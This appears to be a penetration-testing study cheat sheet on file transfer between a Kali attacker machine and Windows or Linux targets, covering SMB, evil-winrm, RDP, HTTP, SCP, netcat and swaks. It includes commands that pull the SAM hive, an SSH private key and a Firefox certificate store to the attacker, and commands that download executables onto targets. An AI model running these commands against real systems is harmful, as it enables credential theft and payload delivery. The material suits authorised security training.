##### **File Transfer From Windows:** Change Username, Password and Share name accordingly if needed.

**Transfer using SMB Shares:**
Run this command in kali machine to open share 'test'.
```
impacket-smbserver test . -smb2support -username username -password password
```
```
net use m: \\192.168.49.116\test /user:username password
```

Run this command in the directory where the file need to be transferred is located
```
impacket-smbserver kali .
```
```
copy \\kali-ip\kali\file\to\copy
```
```
copy C:\file\to\copy\to\our\local_machine \\kali-ip\kali
```

Run this command in Windows system after the connection to copy the file from Windows to Linux.
```
copy file.txt m:\
```

**Transfer using Evil-Winrm:**
Run this command in evil-winrm session to copy the file from Windows to Linux.
```
download C:\windows.old\Windows\System32\SAM /root/oscp/SAM
```

**Transfer using RDP mounting with Xfreerdp:**
Establish a rdp session using the command, then you will get a shared folder between Linux and remote windows system.
```
xfreerdp /cert-ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD/v:192.168.212.250 /w:1600 /h:800 /drive:test,/path/to/save/file
```

##### **File Transfer From Linux:** Change path, username, Ip, file name accordingly

**Transfer using Python web Server:**
Run the command on a directory where the file to transfer is located.
```
python3 -m http.server 80
```

Run the command on Powershell session (Windows System).
```
wget -Uri http://you_kali_ip/anything.exe -Outfile C:\Windows\Temp\anything.exe
```
```
wget -Uri http://you_kali_ip/anything.exe -Outfile anything.exe
```

**Transfer using SCP:** 
Transfer a file from remote to local.
```
scp /home/emiller/development/grade-app.apk root@192.168.45.229:/root/
```

Can copy a file from target Linux to our local.
```
scp -P 43022 dademola@192.168.189.125:/home/git/.ssh/id_rsa .
```
```
scp -o StrictHostKeyChecking=no -r elliot@192.168.195.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db /root/Desktop/Tools/firefox_decrypt/
```

**Transfer using Netcat:**
Run this command in receiver Linux machine.
```
nc -lvp 1234 > grade-app.apk
```

Run this command in Sender Linux machine.
```
nc kali_ip 1234 < /home/emiller/development/grade-app.apk
```

**Transfer file via email Using SWAKS:**
```
swaks -t TO EMAIL --from FROM EMAIL -au USERNAME -ap PASSWORD --attach @./FILE_TO_ATTACH --server *TARGET_IP* --body --header "Subject: Problems"
```

**Transfer using Download function in Windows Powershell session:**
```
powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://example.com/file.txt', 'C:\path\to\save\file.txt')"
```
```
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://example.com/file.txt', 'C:\path\to\save\file.txt')"
```
